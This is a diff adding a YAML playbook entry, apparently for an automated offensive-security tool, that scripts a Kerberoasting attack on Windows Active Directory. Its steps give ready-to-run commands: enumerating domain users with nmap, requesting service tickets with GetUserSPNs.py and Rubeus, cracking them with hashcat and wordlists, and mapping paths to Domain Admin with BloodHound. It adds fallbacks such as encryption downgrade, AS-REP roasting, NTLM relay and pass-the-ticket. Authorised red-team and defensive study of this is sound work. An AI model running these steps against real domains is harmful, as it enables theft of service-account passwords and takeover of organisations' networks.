@@ -1,0 +1,51 @@
+id: ad_kerberoast
+title: "Active Directory — Kerberoasting (TGS-REP cracking)"
+phase: lateral
+mitre: ["T1558.003", "T1003.006"]
+trigger:
+  services: ["kerberos", "ldap", "smb", "msrpc"]
+  ports:    [88, 389, 636, 3268, 3269, 445]
+  os_any:   ["windows", "windows server"]
+  technologies: ["active directory", "domain"]
+  cves: []
+keywords:
+  - "kerberoast"
+  - "kerberoasting"
+  - "tgs-rep"
+  - "spn"
+  - "service principal name"
+  - "rubeus"
+  - "getuserspns.py"
+  - "impacket kerberoast"
+preconditions:
+  - "Any valid domain account (lowest priv is fine)"
+  - "Reachability to a DC on TCP/88 + LDAP"
+  - "Knowledge of domain FQDN + DC IP"
+steps:
+  - tool: nmap
+    cmd:  "nmap -p88,389,445 --script=krb5-enum-users --script-args=krb5-enum-users.realm='{domain}' {dc_ip}"
+    why:  "Enum domain users via Kerberos pre-auth (no creds needed)"
+  - tool: getuserspns
+    cmd:  "GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile spns.kerb"
+    why:  "Request TGS for every account with SPN — output is hashcat-ready"
+  - tool: rubeus
+    cmd:  "Rubeus.exe kerberoast /outfile:spns.kerb /nowrap"
+    why:  "Same primitive from a domain-joined Windows host (no creds needed if logged in)"
+  - tool: hashcat
+    cmd:  "hashcat -m 13100 spns.kerb /usr/share/wordlists/rockyou.txt --force -O"
+    why:  "Crack RC4-HMAC TGS hashes — tractable in minutes for weak service passwords"
+  - tool: hashcat
+    cmd:  "hashcat -m 13100 spns.kerb /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O"
+    why:  "Apply rule transforms when straight wordlist fails"
+  - tool: bloodhound
+    cmd:  "bloodhound-python -d {domain} -u {user} -p {password} -ns {dc_ip} -c All --zip"
+    why:  "Map cracked-account paths to high-value targets (Domain Admins, T0 assets)"
+expected_outcome: "Plaintext password for one or more service accounts → lateral movement / DA path"
+fallbacks:
+  - "Etype downgrade — request RC4 explicitly when DCs prefer AES (Rubeus /tgtdeleg + /nopreauth)"
+  - "If no SPN accounts → AS-REP roast (T1558.004) for accounts with PreAuth disabled"
+  - "If hashes uncrackable → use them for relay (impacket-ntlmrelayx) or pass-the-ticket"
+  - "Always pivot to BloodHound to find shortest path from cracked account → Domain Admin"
+references:
+  - "https://attack.mitre.org/techniques/T1558/003/"
+  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
